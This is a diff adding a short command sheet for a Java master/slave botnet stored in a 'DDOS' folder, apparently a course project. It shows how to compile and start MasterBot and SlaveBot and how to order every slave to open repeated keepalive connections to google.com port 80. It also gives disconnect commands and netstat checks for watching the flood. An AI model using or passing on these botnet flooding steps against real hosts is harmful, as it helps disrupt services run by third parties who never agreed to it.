@@ -1,0 +1,31 @@
+commands
+
+connect all google.com 80 3 keepalive
+connect all google.com 80 keepalive
+connect all google.com 80
+connect all google.com 80 3 
+connect all google.com 80 3 url=/#q=
+connect all google.com 80 url=/#q=
+
+disconnect all google.com 80
+disconnect all google.com
+
+cd..
+cd..
+cd CodeRepository->DDOS->src
+
+Master 
+	javac MasterBot.java
+	java MasterBot -p 1234
+
+Slave
+	javac SlaveBot.java
+	java SlaveBot -h localhost -p 1234
+
+admin cmd
+	netstat -f -b
+
+for keepalive
+	on linux ubuntu
+		sudo netstat -pt -o
+
